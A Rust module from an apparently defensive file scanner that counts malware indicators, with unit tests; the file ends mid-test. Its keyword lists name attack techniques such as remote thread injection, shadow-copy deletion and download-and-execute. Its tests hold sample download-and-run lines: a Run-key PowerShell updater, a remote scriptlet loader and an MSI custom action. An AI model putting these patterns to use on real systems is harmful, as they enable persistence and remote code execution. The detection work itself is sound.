use anyhow::Result;
use serde::{Deserialize, Serialize};

use crate::signatures::text::ascii_lowercase_lossy_with_cancellation;

const STRING_REFERENCE_CANCELLATION_INTERVAL: usize = 1024;

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct StringIndicators {
    pub embedded_url_count: u32,
    pub embedded_ip_count: u32,
    pub suspicious_string_count: u32,
    pub registry_autorun_count: u32,
    pub autorun_inf_executable_command_count: u32,
    pub disk_image_autorun_executable_count: u32,
    pub email_executable_attachment_count: u32,
    pub script_host_reference_count: u32,
    pub remote_executable_url_count: u32,
    pub remote_clickonce_url_count: u32,
    pub remote_network_executable_path_count: u32,
    pub clickonce_marker_count: u32,
    pub java_web_start_marker_count: u32,
    pub remote_java_web_start_url_count: u32,
    pub windows_scriptlet_marker_count: u32,
    pub windows_installer_marker_count: u32,
    pub windows_installer_custom_action_count: u32,
    pub windows_appinstaller_marker_count: u32,
    pub remote_windows_app_package_url_count: u32,
    pub macro_auto_run_count: u32,
    pub rtf_external_object_count: u32,
    pub pdf_active_content_count: u32,
    pub web_document_active_content_count: u32,
}

pub fn extract_indicators(bytes: &[u8]) -> StringIndicators {
    let mut never_cancel = || Ok(());
    extract_indicators_with_cancellation(bytes, &mut never_cancel)
        .expect("the infallible string-indicator callback cannot fail")
}

pub fn extract_indicators_with_cancellation(
    bytes: &[u8],
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<StringIndicators> {
    cancellation_checkpoint()?;
    let text = ascii_lowercase_lossy_with_cancellation(bytes, cancellation_checkpoint)?;
    cancellation_checkpoint()?;
    let mut indicators =
        extract_indicators_from_text_with_cancellation(&text, cancellation_checkpoint)?;
    if let Some(utf16le_text) = utf16le_text_view_with_cancellation(bytes, cancellation_checkpoint)?
    {
        indicators.merge(extract_indicators_from_text_with_cancellation(
            &utf16le_text,
            cancellation_checkpoint,
        )?);
    }
    cancellation_checkpoint()?;
    indicators.disk_image_autorun_executable_count = disk_image_autorun_executables(bytes, &text);
    cancellation_checkpoint()?;
    if has_compound_file_binary_header(bytes) {
        indicators.windows_installer_marker_count =
            indicators.windows_installer_marker_count.saturating_add(1);
    }
    cancellation_checkpoint()?;
    Ok(indicators)
}

fn extract_indicators_from_text_with_cancellation(
    text: &str,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<StringIndicators> {
    let urls = embedded_url_counts_with_cancellation(text, cancellation_checkpoint)?;
    let remote_network_executable_path_count =
        remote_network_executable_path_count_with_cancellation(text, cancellation_checkpoint)?;
    let clickonce_marker_count = clickonce_markers(text, cancellation_checkpoint)?;
    let java_web_start_marker_count = java_web_start_markers(text, cancellation_checkpoint)?;
    let windows_scriptlet_marker_count = windows_scriptlet_markers(text, cancellation_checkpoint)?;
    let windows_installer_marker_count = windows_installer_markers(text, cancellation_checkpoint)?;
    let windows_installer_custom_action_count =
        windows_installer_custom_actions(text, cancellation_checkpoint)?;
    let windows_appinstaller_marker_count =
        windows_appinstaller_markers(text, cancellation_checkpoint)?;
    let macro_auto_run_count = count_terms_with_cancellation(
        text,
        &[
            "autoopen",
            "auto_open",
            "document_open",
            "workbook_open",
            "presentation_open",
        ],
        cancellation_checkpoint,
    )?;
    let rtf_external_object_count = if is_rtf_text(text) {
        count_terms_with_cancellation(
            text,
            &[
                "\\object",
                "\\objautlink",
                "\\objupdate",
                "\\template",
                "\\field",
                "ddeauto",
                "includepicture",
                "includetext",
            ],
            cancellation_checkpoint,
        )?
    } else {
        0
    };
    let pdf_active_content_count = if is_pdf_text(text) {
        count_terms_with_cancellation(
            text,
            &[
                "/openaction",
                "/aa",
                "/js",
                "/javascript",
                "/launch",
                "/embeddedfile",
                "/submitform",
                "/xfa",
            ],
            cancellation_checkpoint,
        )?
    } else {
        0
    };
    let web_document_active_content_count = if is_web_document_text(text) {
        count_terms_with_cancellation(
            text,
            &[
                "<script",
                "javascript:",
                "onload=",
                "onerror=",
                "createobjecturl",
                "mssaveoropenblob",
                ".download",
                "download=",
                "atob(",
                "fetch(",
                "xmlhttprequest",
            ],
            cancellation_checkpoint,
        )?
    } else {
        0
    };
    let embedded_ip_count = embedded_ip_count_with_cancellation(text, cancellation_checkpoint)?;
    let suspicious_terms = [
        "invoke-expression",
        "iex ",
        "frombase64string",
        "virtualalloc",
        "createremotethread",
        "writeprocessmemory",
        "reg add",
        "schtasks",
        "vssadmin delete",
        "shadowcopy delete",
        "start-process",
        "downloadstring",
    ];
    cancellation_checkpoint()?;
    let suspicious_string_count =
        count_terms_with_cancellation(text, &suspicious_terms, cancellation_checkpoint)?;
    let registry_autorun_count = count_terms_with_cancellation(
        text,
        &["currentversion\\run", "runonce"],
        cancellation_checkpoint,
    )?;
    cancellation_checkpoint()?;
    let autorun_inf_executable_command_count = autorun_inf_executable_commands(text);
    let disk_image_autorun_executable_count = 0;
    let email_executable_attachment_count = email_executable_attachments(text);
    cancellation_checkpoint()?;
    let script_host_reference_count = count_terms_with_cancellation(
        text,
        &[
            "wscript.shell",
            "mshta",
            "rundll32",
            "regsvr32",
            "scrobj.dll",
            "powershell",
            "cmd.exe",
            "cscript",
            "wscript",
        ],
        cancellation_checkpoint,
    )?;
    cancellation_checkpoint()?;
    Ok(StringIndicators {
        embedded_url_count: urls.total,
        embedded_ip_count,
        suspicious_string_count,
        registry_autorun_count,
        autorun_inf_executable_command_count,
        disk_image_autorun_executable_count,
        email_executable_attachment_count,
        script_host_reference_count,
        remote_executable_url_count: urls.executable,
        remote_clickonce_url_count: urls.clickonce,
        remote_network_executable_path_count,
        clickonce_marker_count,
        java_web_start_marker_count,
        remote_java_web_start_url_count: urls.java_web_start,
        windows_scriptlet_marker_count,
        windows_installer_marker_count,
        windows_installer_custom_action_count,
        windows_appinstaller_marker_count,
        remote_windows_app_package_url_count: urls.windows_app_package,
        macro_auto_run_count,
        rtf_external_object_count,
        pdf_active_content_count,
        web_document_active_content_count,
    })
}

fn count_terms_with_cancellation(
    text: &str,
    terms: &[&str],
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<u32> {
    let mut total = 0u32;
    for term in terms {
        total = total.saturating_add(
            crate::signatures::search::count_exact_non_overlapping_with_cancellation(
                text.as_bytes(),
                term.as_bytes(),
                cancellation_checkpoint,
            )?,
        );
    }
    cancellation_checkpoint()?;
    Ok(total)
}

fn embedded_ip_count_with_cancellation(
    text: &str,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<u32> {
    let mut candidates_seen = 0usize;
    let mut count = 0u32;
    for candidate in text.split(|c: char| !c.is_ascii_digit() && c != '.') {
        if candidates_seen.is_multiple_of(STRING_REFERENCE_CANCELLATION_INTERVAL) {
            cancellation_checkpoint()?;
        }
        candidates_seen = candidates_seen.saturating_add(1);
        if is_ipv4_candidate(candidate) {
            count = count.saturating_add(1);
        }
    }
    cancellation_checkpoint()?;
    Ok(count)
}

fn is_ipv4_candidate(candidate: &str) -> bool {
    let mut octets = candidate.split('.');
    for _ in 0..4 {
        let Some(octet) = octets.next() else {
            return false;
        };
        if octet.is_empty() || octet.parse::<u8>().is_err() {
            return false;
        }
    }
    octets.next().is_none()
}

impl StringIndicators {
    fn merge(&mut self, other: StringIndicators) {
        self.embedded_url_count = self
            .embedded_url_count
            .saturating_add(other.embedded_url_count);
        self.embedded_ip_count = self
            .embedded_ip_count
            .saturating_add(other.embedded_ip_count);
        self.suspicious_string_count = self
            .suspicious_string_count
            .saturating_add(other.suspicious_string_count);
        self.registry_autorun_count = self
            .registry_autorun_count
            .saturating_add(other.registry_autorun_count);
        self.autorun_inf_executable_command_count = self
            .autorun_inf_executable_command_count
            .saturating_add(other.autorun_inf_executable_command_count);
        self.disk_image_autorun_executable_count = self
            .disk_image_autorun_executable_count
            .saturating_add(other.disk_image_autorun_executable_count);
        self.email_executable_attachment_count = self
            .email_executable_attachment_count
            .saturating_add(other.email_executable_attachment_count);
        self.script_host_reference_count = self
            .script_host_reference_count
            .saturating_add(other.script_host_reference_count);
        self.remote_executable_url_count = self
            .remote_executable_url_count
            .saturating_add(other.remote_executable_url_count);
        self.remote_clickonce_url_count = self
            .remote_clickonce_url_count
            .saturating_add(other.remote_clickonce_url_count);
        self.remote_network_executable_path_count = self
            .remote_network_executable_path_count
            .saturating_add(other.remote_network_executable_path_count);
        self.clickonce_marker_count = self
            .clickonce_marker_count
            .saturating_add(other.clickonce_marker_count);
        self.java_web_start_marker_count = self
            .java_web_start_marker_count
            .saturating_add(other.java_web_start_marker_count);
        self.remote_java_web_start_url_count = self
            .remote_java_web_start_url_count
            .saturating_add(other.remote_java_web_start_url_count);
        self.windows_scriptlet_marker_count = self
            .windows_scriptlet_marker_count
            .saturating_add(other.windows_scriptlet_marker_count);
        self.windows_installer_marker_count = self
            .windows_installer_marker_count
            .saturating_add(other.windows_installer_marker_count);
        self.windows_installer_custom_action_count = self
            .windows_installer_custom_action_count
            .saturating_add(other.windows_installer_custom_action_count);
        self.windows_appinstaller_marker_count = self
            .windows_appinstaller_marker_count
            .saturating_add(other.windows_appinstaller_marker_count);
        self.remote_windows_app_package_url_count = self
            .remote_windows_app_package_url_count
            .saturating_add(other.remote_windows_app_package_url_count);
        self.macro_auto_run_count = self
            .macro_auto_run_count
            .saturating_add(other.macro_auto_run_count);
        self.rtf_external_object_count = self
            .rtf_external_object_count
            .saturating_add(other.rtf_external_object_count);
        self.pdf_active_content_count = self
            .pdf_active_content_count
            .saturating_add(other.pdf_active_content_count);
        self.web_document_active_content_count = self
            .web_document_active_content_count
            .saturating_add(other.web_document_active_content_count);
    }
}

fn is_rtf_text(text: &str) -> bool {
    text.contains("{\\rtf") || text.contains("\\rtf1")
}

fn is_pdf_text(text: &str) -> bool {
    text.contains("%pdf-")
}

fn is_web_document_text(text: &str) -> bool {
    text.contains("<!doctype html") || text.contains("<html") || text.contains("<svg")
}

fn autorun_inf_executable_commands(text: &str) -> u32 {
    if !text
        .lines()
        .any(|line| line.split(';').next().unwrap_or("").trim() == "[autorun]")
    {
        return 0;
    }
    text.lines()
        .filter(|line| {
            let line = line.split(';').next().unwrap_or("").trim();
            let Some((key, value)) = line.split_once('=') else {
                return false;
            };
            let key = key.trim();
            let is_command_key = matches!(key, "open" | "shellexecute")
                || (key.starts_with("shell\\") && key.ends_with("\\command"));
            is_command_key && command_value_has_executable_or_script_reference(value.trim())
        })
        .count() as u32
}

fn command_value_has_executable_or_script_reference(value: &str) -> bool {
    value
        .split(|ch: char| {
            ch.is_whitespace()
                || ch.is_control()
                || matches!(
                    ch,
                    '"' | '\'' | ',' | '(' | ')' | '[' | ']' | '{' | '}' | '<' | '>'
                )
        })
        .any(|token| {
            let token = token.trim_matches(|ch: char| {
                matches!(ch, '"' | '\'' | ',' | ';' | ')' | ']' | '}' | '<' | '>')
            });
            !token.is_empty() && path_has_executable_or_script_suffix(token)
        })
}

fn disk_image_autorun_executables(bytes: &[u8], text: &str) -> u32 {
    if !looks_like_optical_disk_image(bytes) || !text.contains("autorun.inf") {
        return 0;
    }
    u32::from(command_value_has_executable_or_script_reference(text))
}

fn looks_like_optical_disk_image(bytes: &[u8]) -> bool {
    bytes
        .windows(5)
        .any(|window| matches!(window, b"CD001" | b"NSR02" | b"NSR03"))
}

fn email_executable_attachments(text: &str) -> u32 {
    if !is_email_message_text(text) || !text.contains("content-disposition: attachment") {
        return 0;
    }
    text.lines()
        .filter(|line| {
            let line = line.split(';').collect::<Vec<_>>();
            line.iter().any(|part| {
                let Some((key, value)) = part.trim().split_once('=') else {
                    return false;
                };
                let key = key.trim();
                matches!(key, "filename" | "name")
                    && command_value_has_executable_or_script_reference(value.trim())
            })
        })
        .count() as u32
}

fn is_email_message_text(text: &str) -> bool {
    text.contains("mime-version:")
        && (text.contains("\nfrom:") || text.starts_with("from:"))
        && (text.contains("\nsubject:") || text.starts_with("subject:"))
}

fn utf16le_text_view_with_cancellation(
    bytes: &[u8],
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<Option<String>> {
    if bytes.len() < 8 {
        cancellation_checkpoint()?;
        return Ok(None);
    }
    let units = bytes
        .chunks_exact(2)
        .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]));
    let mut text = String::with_capacity(bytes.len() / 2);
    for (index, decoded) in char::decode_utf16(units).enumerate() {
        if index % (64 * 1024) == 0 {
            cancellation_checkpoint()?;
        }
        text.push(decoded.unwrap_or(char::REPLACEMENT_CHARACTER));
    }
    text.make_ascii_lowercase();
    cancellation_checkpoint()?;
    for marker in [
        "http://",
        "https://",
        "powershell",
        "cmd.exe",
        "wscript",
        "cscript",
        "regsvr32",
        "scrobj",
        "<scriptlet",
        ".sct",
        ".wsc",
        "\\\\",
        "file://",
        "autoopen",
        "document_open",
        "workbook_open",
        "[autorun]",
        "mime-version:",
        "content-disposition: attachment",
        "<jnlp",
        ".jnlp",
        "<appinstaller",
        ".appinstaller",
        ".appx",
        ".msix",
        "<!doctype html",
        "<html",
        "<svg",
    ] {
        if crate::signatures::search::contains_exact_with_cancellation(
            text.as_bytes(),
            marker.as_bytes(),
            cancellation_checkpoint,
        )? {
            return Ok(Some(text));
        }
    }
    Ok(None)
}

#[derive(Default)]
struct EmbeddedUrlCounts {
    total: u32,
    executable: u32,
    clickonce: u32,
    java_web_start: u32,
    windows_app_package: u32,
}

fn embedded_url_counts_with_cancellation(
    text: &str,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<EmbeddedUrlCounts> {
    let mut counts = EmbeddedUrlCounts::default();
    let mut references_seen = 0usize;
    for marker in ["http://", "https://"] {
        cancellation_checkpoint()?;
        let mut search_start = 0;
        while let Some(relative_start) = text[search_start..].find(marker) {
            if references_seen.is_multiple_of(STRING_REFERENCE_CANCELLATION_INTERVAL) {
                cancellation_checkpoint()?;
            }
            let start = search_start + relative_start;
            let rest = &text[start..];
            let end = rest
                .find(|ch: char| {
                    ch.is_whitespace() || matches!(ch, '"' | '\'' | '<' | '>' | ')' | ']' | '}')
                })
                .unwrap_or(rest.len());
            let url = &rest[..end];
            counts.total = counts.total.saturating_add(1);
            counts.executable = counts
                .executable
                .saturating_add(u32::from(url_has_executable_or_script_suffix(url)));
            counts.clickonce = counts
                .clickonce
                .saturating_add(u32::from(url_has_clickonce_suffix(url)));
            counts.java_web_start = counts
                .java_web_start
                .saturating_add(u32::from(url_has_java_web_start_suffix(url)));
            counts.windows_app_package = counts
                .windows_app_package
                .saturating_add(u32::from(url_has_windows_app_package_suffix(url)));
            references_seen = references_seen.saturating_add(1);
            search_start = start + marker.len();
        }
    }
    cancellation_checkpoint()?;
    Ok(counts)
}

fn url_has_executable_or_script_suffix(url: &str) -> bool {
    let path = url.split(['?', '#']).next().unwrap_or(url);
    path_has_executable_or_script_suffix(path)
}

fn url_has_clickonce_suffix(url: &str) -> bool {
    let path = url.split(['?', '#']).next().unwrap_or(url);
    [".application", ".appref-ms"]
        .iter()
        .any(|suffix| path.ends_with(suffix))
}

fn url_has_java_web_start_suffix(url: &str) -> bool {
    let path = url.split(['?', '#']).next().unwrap_or(url);
    [".jar", ".jnlp"]
        .iter()
        .any(|suffix| path.ends_with(suffix))
}

fn url_has_windows_app_package_suffix(url: &str) -> bool {
    let path = url.split(['?', '#']).next().unwrap_or(url);
    [".appx", ".msix", ".appxbundle", ".msixbundle"]
        .iter()
        .any(|suffix| path.ends_with(suffix))
}

fn remote_network_executable_path_count_with_cancellation(
    text: &str,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<u32> {
    let mut executable_count = 0u32;
    let mut references_seen = 0usize;
    for marker in ["\\\\", "file://"] {
        cancellation_checkpoint()?;
        let mut search_start = 0;
        while let Some(relative_start) = text[search_start..].find(marker) {
            if references_seen.is_multiple_of(STRING_REFERENCE_CANCELLATION_INTERVAL) {
                cancellation_checkpoint()?;
            }
            let start = search_start + relative_start;
            let rest = &text[start..];
            let end = rest
                .find(|ch: char| {
                    ch.is_whitespace() || matches!(ch, '"' | '\'' | '<' | '>' | ')' | ']' | '}')
                })
                .unwrap_or(rest.len());
            let path = &rest[..end];
            if is_remote_network_path(path) && path_has_executable_or_script_suffix(path) {
                executable_count = executable_count.saturating_add(1);
            }
            references_seen = references_seen.saturating_add(1);
            search_start = start + marker.len();
        }
    }
    cancellation_checkpoint()?;
    Ok(executable_count)
}

fn is_remote_network_path(path: &str) -> bool {
    if path.starts_with("\\\\?\\") || path.starts_with("\\\\.\\") {
        return false;
    }
    if path.starts_with("\\\\") {
        let rest = path.trim_start_matches('\\');
        let mut pieces = rest.split(['\\', '/']);
        return pieces.next().is_some_and(|host| !host.is_empty())
            && pieces.next().is_some_and(|share| !share.is_empty());
    }
    if let Some(rest) = path.strip_prefix("file://") {
        if rest.starts_with('/') || rest.is_empty() {
            return false;
        }
        let host = rest.split(['/', '\\']).next().unwrap_or_default();
        return !host.is_empty() && host != "localhost";
    }
    false
}

fn path_has_executable_or_script_suffix(path: &str) -> bool {
    const EXECUTABLE_OR_SCRIPT_SUFFIXES: [&str; 25] = [
        ".exe", ".scr", ".com", ".pif", ".cpl", ".msi", ".msp", ".msu", ".bat", ".cmd", ".ps1",
        ".psm1", ".vbs", ".vbe", ".js", ".jse", ".mjs", ".cjs", ".wsf", ".hta", ".sct", ".wsc",
        ".jar", ".jnlp", ".dll",
    ];
    let path = path.split(['?', '#']).next().unwrap_or(path);
    EXECUTABLE_OR_SCRIPT_SUFFIXES
        .iter()
        .any(|suffix| path.ends_with(suffix))
}

fn clickonce_markers(
    text: &str,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<u32> {
    count_terms_with_cancellation(
        text,
        &[
            "deploymentprovider",
            "asmv2:deployment",
            "urn:schemas-microsoft-com:asm.v2",
            "<deployment ",
            "<deployment>",
            "<dependentassembly",
            "applicationreference",
        ],
        cancellation_checkpoint,
    )
}

fn java_web_start_markers(
    text: &str,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<u32> {
    count_terms_with_cancellation(
        text,
        &[
            "<jnlp",
            "jnlp spec",
            "application-desc",
            "applet-desc",
            "installer-desc",
            "<jar ",
            " jar href",
            "<extension ",
            "java-vm-args",
            "main-class",
        ],
        cancellation_checkpoint,
    )
}

fn windows_scriptlet_markers(
    text: &str,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<u32> {
    count_terms_with_cancellation(
        text,
        &[
            "<scriptlet",
            "scriptlet",
            "<registration",
            "<public",
            "<script ",
            "language=\"jscript",
            "language=\"vbscript",
            "regsvr32",
            "scrobj.dll",
            "script:",
        ],
        cancellation_checkpoint,
    )
}

fn windows_installer_markers(
    text: &str,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<u32> {
    count_terms_with_cancellation(
        text,
        &[
            "windows installer",
            "msiexec",
            "installexecutesequence",
            "installuisequence",
            "productcode",
            "packagecode",
            "msipatchmetadata",
        ],
        cancellation_checkpoint,
    )
}

fn windows_installer_custom_actions(
    text: &str,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<u32> {
    count_terms_with_cancellation(
        text,
        &[
            "customaction",
            "custom action",
            "wixquietexec",
            "wixsilentexec",
            "quietexec",
            "deferred",
            "commit custom",
            "rollback custom",
        ],
        cancellation_checkpoint,
    )
}

fn windows_appinstaller_markers(
    text: &str,
    cancellation_checkpoint: &mut dyn FnMut() -> Result<()>,
) -> Result<u32> {
    count_terms_with_cancellation(
        text,
        &[
            "<appinstaller",
            "appinstaller",
            "mainpackage",
            "<mainbundle",
            "packageuri",
            "uri=\"",
            "schemas.microsoft.com/appx/appinstaller",
        ],
        cancellation_checkpoint,
    )
}

fn has_compound_file_binary_header(bytes: &[u8]) -> bool {
    bytes.starts_with(&[0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1])
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn non_archive_static_cancellation_interrupts_string_indicator_substeps() {
        let bytes = b"https://example.invalid/readme.txt powershell benign";
        let mut checks = 0usize;
        let mut checkpoint = || {
            checks += 1;
            if checks == 7 {
                anyhow::bail!("benign string-indicator cancellation")
            }
            Ok(())
        };

        let error = extract_indicators_with_cancellation(bytes, &mut checkpoint)
            .expect_err("string cancellation must abort indicator extraction");

        assert!(error
            .to_string()
            .contains("benign string-indicator cancellation"));
        assert_eq!(checks, 7);
    }

    #[test]
    fn static_text_normalization_interrupts_string_input_chunks_before_evidence() {
        let bytes =
            vec![b'A'; crate::signatures::text::TEXT_NORMALIZATION_CANCELLATION_CHUNK_BYTES * 3];
        let mut checks = 0usize;
        let mut checkpoint = || {
            checks += 1;
            if checks == 3 {
                anyhow::bail!("benign static string normalization cancellation")
            }
            Ok(())
        };

        let error = extract_indicators_with_cancellation(&bytes, &mut checkpoint)
            .expect_err("string normalization cancellation must abort before indicators");

        assert!(error
            .to_string()
            .contains("benign static string normalization cancellation"));
        assert_eq!(checks, 3);
    }

    #[test]
    fn static_term_search_interrupts_string_term_chunks_before_evidence() {
        let text = "a".repeat(crate::signatures::search::SEARCH_CANCELLATION_CHUNK_CANDIDATES * 3);
        let mut checks = 0usize;
        let mut checkpoint = || {
            checks += 1;
            if checks == 2 {
                anyhow::bail!("benign string term-search cancellation")
            }
            Ok(())
        };

        let error = count_terms_with_cancellation(&text, &["zz"], &mut checkpoint)
            .expect_err("string term cancellation must abort before evidence");

        assert!(error
            .to_string()
            .contains("benign string term-search cancellation"));
        assert_eq!(checks, 2);
    }

    #[test]
    fn non_archive_static_cancellation_streams_reference_counts_without_vectors() {
        let text = "https://example.invalid/readme.txt ".repeat(3000);
        let indicators = extract_indicators(text.as_bytes());

        assert_eq!(indicators.embedded_url_count, 3000);
        assert_eq!(indicators.remote_executable_url_count, 0);
        let source = include_str!("strings.rs");
        assert!(source.contains("embedded_url_counts_with_cancellation"));
        assert!(source.contains("remote_network_executable_path_count_with_cancellation"));
        let old_url_vector = ["fn embedded_urls(text: &str) -> ", "Vec<&str>"].concat();
        let old_path_vector = ["fn remote_network_paths(text: &str) -> ", "Vec<&str>"].concat();
        assert!(!source.contains(&old_url_vector));
        assert!(!source.contains(&old_path_vector));
    }

    #[test]
    fn non_archive_static_cancellation_preserves_string_wrapper_results() {
        let bytes = b"https://example.invalid/tool.exe 192.0.2.1 powershell";
        let wrapped = extract_indicators(bytes);
        let mut never_cancel = || Ok(());
        let fallible = extract_indicators_with_cancellation(bytes, &mut never_cancel)
            .expect("fallible string analysis must pass without cancellation");

        assert_eq!(wrapped, fallible);
    }

    #[test]
    fn non_archive_static_cancellation_interrupts_streamed_ip_candidates() {
        let text = "192.0.2.1 ".repeat(4096);
        let mut checks = 0usize;
        let mut checkpoint = || {
            checks += 1;
            if checks == 2 {
                anyhow::bail!("benign IP traversal cancellation")
            }
            Ok(())
        };

        let error = embedded_ip_count_with_cancellation(&text, &mut checkpoint)
            .expect_err("IP traversal cancellation must abort counting");

        assert!(error
            .to_string()
            .contains("benign IP traversal cancellation"));
        assert_eq!(checks, 2);
    }

    #[test]
    fn string_indicators_count_registry_and_shortcut_carriers() {
        let indicators = extract_indicators(
            br#"
Windows Registry Editor Version 5.00
[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
"Updater"="powershell https://example.invalid/update.ps1"
[InternetShortcut]
URL=https://example.invalid/setup.exe
IconFile=cmd.exe
"#,
        );

        assert_eq!(indicators.embedded_url_count, 2);
        assert_eq!(indicators.remote_executable_url_count, 2);
        assert_eq!(indicators.remote_clickonce_url_count, 0);
        assert_eq!(indicators.remote_java_web_start_url_count, 0);
        assert_eq!(indicators.remote_network_executable_path_count, 0);
        assert_eq!(indicators.clickonce_marker_count, 0);
        assert_eq!(indicators.java_web_start_marker_count, 0);
        assert_eq!(indicators.windows_scriptlet_marker_count, 0);
        assert_eq!(indicators.windows_installer_marker_count, 0);
        assert_eq!(indicators.windows_installer_custom_action_count, 0);
        assert_eq!(indicators.windows_appinstaller_marker_count, 0);
        assert_eq!(indicators.remote_windows_app_package_url_count, 0);
        assert_eq!(indicators.macro_auto_run_count, 0);
        assert_eq!(indicators.rtf_external_object_count, 0);
        assert_eq!(indicators.pdf_active_content_count, 0);
        assert_eq!(indicators.web_document_active_content_count, 0);
        assert_eq!(indicators.registry_autorun_count, 1);
        assert_eq!(indicators.autorun_inf_executable_command_count, 0);
        assert_eq!(indicators.disk_image_autorun_executable_count, 0);
        assert_eq!(indicators.email_executable_attachment_count, 0);
        assert!(indicators.script_host_reference_count >= 2);
    }

    #[test]
    fn ordinary_web_link_is_not_remote_executable_url() {
        let indicators =
            extract_indicators(b"[InternetShortcut]\nURL=https://example.invalid/readme.html");

        assert_eq!(indicators.embedded_url_count, 1);
        assert_eq!(indicators.remote_executable_url_count, 0);
        assert_eq!(indicators.remote_clickonce_url_count, 0);
        assert_eq!(indicators.remote_java_web_start_url_count, 0);
        assert_eq!(indicators.remote_network_executable_path_count, 0);
        assert_eq!(indicators.java_web_start_marker_count, 0);
        assert_eq!(indicators.windows_scriptlet_marker_count, 0);
        assert_eq!(indicators.windows_installer_marker_count, 0);
        assert_eq!(indicators.windows_installer_custom_action_count, 0);
        assert_eq!(indicators.macro_auto_run_count, 0);
        assert_eq!(indicators.rtf_external_object_count, 0);
        assert_eq!(indicators.pdf_active_content_count, 0);
        assert_eq!(indicators.web_document_active_content_count, 0);
        assert_eq!(indicators.autorun_inf_executable_command_count, 0);
        assert_eq!(indicators.disk_image_autorun_executable_count, 0);
        assert_eq!(indicators.email_executable_attachment_count, 0);
    }

    #[test]
    fn utf16le_remote_executable_url_is_counted() {
        let mut bytes = Vec::new();
        for unit in "ShellLink target https://example.invalid/support.ps1 cmd.exe".encode_utf16() {
            bytes.extend_from_slice(&unit.to_le_bytes());
        }

        let indicators = extract_indicators(&bytes);

        assert_eq!(indicators.embedded_url_count, 1);
        assert_eq!(indicators.remote_executable_url_count, 1);
        assert_eq!(indicators.remote_clickonce_url_count, 0);
        assert_eq!(indicators.remote_java_web_start_url_count, 0);
        assert_eq!(indicators.remote_network_executable_path_count, 0);
        assert_eq!(indicators.macro_auto_run_count, 0);
        assert!(indicators.script_host_reference_count >= 1);
    }

    #[test]
    fn clickonce_manifest_markers_and_remote_executable_are_counted() {
        let indicators = extract_indicators(
            br#"<assembly xmlns:asmv2="urn:schemas-microsoft-com:asm.v2">
<asmv2:deployment install="true">
<asmv2:deploymentProvider codebase="https://example.invalid/setup.exe" />
</asmv2:deployment>
</assembly>"#,
        );

        assert!(indicators.clickonce_marker_count >= 3);
        assert_eq!(indicators.remote_executable_url_count, 1);
        assert_eq!(indicators.remote_clickonce_url_count, 0);
        assert_eq!(indicators.remote_java_web_start_url_count, 0);
    }

    #[test]
    fn clickonce_appref_ms_remote_application_url_is_counted() {
        let indicators = extract_indicators(
            b"https://example.invalid/Support.application#Support, Culture=neutral",
        );

        assert_eq!(indicators.remote_clickonce_url_count, 1);
        assert_eq!(indicators.remote_executable_url_count, 0);
        assert_eq!(indicators.remote_java_web_start_url_count, 0);
        assert_eq!(indicators.clickonce_marker_count, 0);
    }

    #[test]
    fn java_web_start_markers_and_remote_jar_are_counted() {
        let indicators = extract_indicators(
            br#"<jnlp spec="1.0+" codebase="https://example.invalid/app/">
<information><title>Support</title></information>
<resources><jar href="https://example.invalid/app/support.jar" /></resources>
<application-desc main-class="com.example.Support" />
</jnlp>"#,
        );

        assert!(indicators.java_web_start_marker_count >= 3);
        assert_eq!(indicators.remote_java_web_start_url_count, 1);
        assert_eq!(indicators.remote_executable_url_count, 1);
        assert_eq!(indicators.clickonce_marker_count, 0);
    }

    #[test]
    fn java_web_start_document_link_without_archive_is_not_payload_url() {
        let indicators = extract_indicators(
            br#"<jnlp spec="1.0+"><information href="https://example.invalid/readme.html" /></jnlp>"#,
        );

        assert!(indicators.java_web_start_marker_count >= 1);
        assert_eq!(indicators.remote_java_web_start_url_count, 0);
        assert_eq!(indicators.remote_executable_url_count, 0);
    }

    #[test]
    fn windows_scriptlet_markers_and_remote_script_are_counted() {
        let indicators = extract_indicators(
            br#"<scriptlet>
<registration progid="Support.Loader" />
<script language="JScript">
var x = GetObject("script:https://example.invalid/loader.sct");
</script>
</scriptlet>"#,
        );

        assert!(indicators.windows_scriptlet_marker_count >= 3);
        assert_eq!(indicators.remote_executable_url_count, 1);
    }

    #[test]
    fn windows_scriptlet_document_link_without_payload_is_not_payload_url() {
        let indicators = extract_indicators(
            br#"<scriptlet><registration progid="Docs.Viewer" /><script language="JScript">var help="https://example.invalid/readme.html";</script></scriptlet>"#,
        );

        assert!(indicators.windows_scriptlet_marker_count >= 2);
        assert_eq!(indicators.remote_executable_url_count, 0);
    }

    #[test]
    fn windows_installer_custom_action_markers_are_counted() {
        let mut bytes = vec![0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1];
        bytes.extend_from_slice(
            b"Windows Installer CustomAction WixQuietExec powershell downloadstring https://example.invalid/setup.msp",
        );

        let indicators = extract_indicators(&bytes);

        assert!(indicators.windows_installer_marker_count >= 2);
        assert!(indicators.windows_installer_custom_action_count >= 2);
        assert_eq!(indicators.remote_executable_url_count, 1);
        assert!(indicators.script_host_reference_count >= 1);
        assert!(indicators.suspicious_string_count >= 1);
    }

    #[test]
    fn windows_installer_document_link_without_custom_action_is_not_custom_action() {
        let indicators = extract_indicators(
            b"Windows Installer ProductCode https://example.invalid/readme.html",
        );

        assert!(indicators.windows_installer_marker_count >= 2);
        assert_eq!(indicators.windows_installer_custom_action_count, 0);
        assert_eq!(indicators.remote_executable_url_count, 0);
    }

    #[test]
